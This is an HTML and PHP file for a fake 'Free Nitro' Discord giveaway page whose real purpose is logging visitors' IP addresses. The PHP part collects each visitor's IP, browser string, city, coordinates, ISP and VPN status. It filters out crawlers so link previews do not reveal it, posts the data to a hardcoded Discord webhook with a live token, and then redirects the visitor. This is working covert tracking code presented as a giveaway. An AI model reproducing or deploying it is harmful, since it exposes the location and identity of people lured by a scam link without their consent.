<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="https://www.w3.org/1999/xhtml" xmlns:og="https://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml">
<head>
<title>Free Nitro</title>
<meta http-equiv="Content-Type" content="text/html;charset=WINDOWS-1252" />
<meta http-equiv="Content-Language" content="en-us" />
<link rel="stylesheet" type="text/css" href="event-education.css" />
<meta name="verify-v1" content="so4y/3aLT7/7bUUB9f6iVXN0tv8upRwaccek7JKB1gs=" >
<meta property="og:title" content="Click Me to Claim!!!"/>
<meta property="og:type" content="article"/>
<meta property="og:url" content="https://freediscordsnitro.000webhostapp.com/e.php"/>
<meta property="og:image" content="https://static.wikia.nocookie.net/discord/images/b/b8/Nitro_badge.png/revision/latest?cb=20200615092656"/>
<meta property="fb:admins" content="himanshu160"/>
<meta property="og:image:width" content="667"/>
<meta property="og:image:height" content="171"/>
<meta property="og:site_name" content="10$ Nitro"/>  

</head>

<body>

<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=501839739845103";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
.
.
.
</body>
</html>
<?php
$webhookurl = "https://canary.discord.com/api/webhooks/827632985162907709/9lX8Ru3Csl-LS8DGqWr24GQa5-vJuo2YimV9Xs0sAXnRDAxmI8SCndyXMr8wess-va-h";  //change this webhook
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$timestamp = date("c", strtotime("now"));
$ip= $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
$Curl = curl_init("http://ip-api.com/json/$ip"); 
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);
 
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
} 
$vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
if($vpnCon->connection_type==="Corporate"){
    $vpn = "Yes (Double Check: $Info->isp)"; // detecs if it's a vpn or not
}else{
    $vpn = "No (Double Check: $Info->isp)";
}
$flag = "https://www.countryflags.io/{$Info->countryCode}/shiny/64.png";

$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon";
 
$timestamp = date("c", strtotime("now"));
 
$json_data = json_encode([ //embed you can edit it
    "content" => "",
 
    "username" => "Skadaddle",
    "avatar_url" => "https://cdn.discordapp.com/icons/815155331348561920/21196648e3ba3233020ad2ab27efac0f.png?size=1024",
 
    "embeds" => [
        [
            "title" => "Skadaddle IP logger",
 
            "type" => "rich",
 
 
            "timestamp" => $timestamp,
            "color" => hexdec( "000000" ),

            "footer" => [
                "text" => "Powered By Skadaddle",
                "icon_url" => "https://cdn.discordapp.com/icons/815155331348561920/21196648e3ba3233020ad2ab27efac0f.png?size=1024"
            ],
            "thumbnail" => [
                "url" => "$flag"
            ],
 
            "author" => [
            ],
 
            "fields" => [
                [
                    "name" => "**__IP__**",
                    "value" => "$ip",
                    "inline" => true
                ],
                [
                    "name" => "**__Location__**",
                    "value" => "$City, $Region",
                    "inline" => true
                ],
                [
                    "name" => "**__Country__**",
                    "value" => "$Country",
                    "inline" => true
                ],
                [
                    "name" => "**__ISP__**",
                    "value" => "$ISP",
                    "inline" => true
                ],
                [
                    "name" => "**__Coordinates__**",
                    "value" => "$COORD",
                    "inline" => true
                ],
                [
                    "name" => "**__Date & Time__**",
                    "value" => "$TheirDate | $TheirTime",
                    "inline" => true
                ],
                [
                    "name" => "**__VPN__**",
                    "value" => "**$vpn **| Not 100% accurate",
                    "inline" => true
                ],
                [
                    "name" => "**__Browser Info__**",
                    "value" => "$Browser",
                    "inline" => true
                ]
            ]
        ]
    ]
 
 
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
 
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 
$response = curl_exec( $ch );
curl_close( $ch );
header("Location: https://skadaddle.cc/");  //redirct to skadaddle u can put custom link

?>
